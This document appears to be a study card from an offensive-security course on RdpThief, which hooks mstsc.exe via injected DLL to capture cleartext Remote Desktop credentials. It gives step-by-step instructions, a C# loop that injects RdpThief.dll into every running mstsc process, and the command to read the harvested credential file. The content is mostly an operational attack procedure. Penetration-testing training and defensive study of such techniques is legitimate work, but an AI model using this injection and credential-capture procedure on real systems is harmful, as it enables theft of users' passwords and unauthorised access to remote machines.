# 08.06 RdpThief Credential Theft via mstsc DLL Injection

> Section 9.1.5 · Inject hook DLL into mstsc.exe to capture cleartext credentials

## Overview

RdpThief (MDSec) is an unmanaged DLL that uses Microsoft Detours to hook the APIs in mstsc.exe that handle username/password/domain entry. When a user types credentials into mstsc, the hooks copy them to a file. Inject RdpThief.dll into each running mstsc.exe process via DLL injection.

## Steps

- **Watch for mstsc processes** — polling loop with Thread.Sleep(1000).
- **DLL inject RdpThief.dll** into every mstsc.exe instance.
- **User enters creds** — hooks fire, credentials written to %APPDATA%\RdpThief.txt.
- **Read captured creds** — `type %APPDATA%\RdpThief.txt`.

## Commands

### C# injector — monitor and inject RdpThief.dll

```csharp
// Simplified loop from the textbook
while (true) {
    Process[] procs = Process.GetProcessesByName("mstsc");
    foreach (var p in procs) {
        // DLL injection code (see DLL Injection card)
        // OpenProcess → VirtualAllocEx → WriteProcessMemory(path) → CreateRemoteThread(LoadLibrary)
        InjectDll(p.Id, @"C:\Tools\RdpThief.dll");
    }
    System.Threading.Thread.Sleep(1000);
}
```

### Read captured credentials

```cmd
type %APPDATA%\RdpThief.txt
```
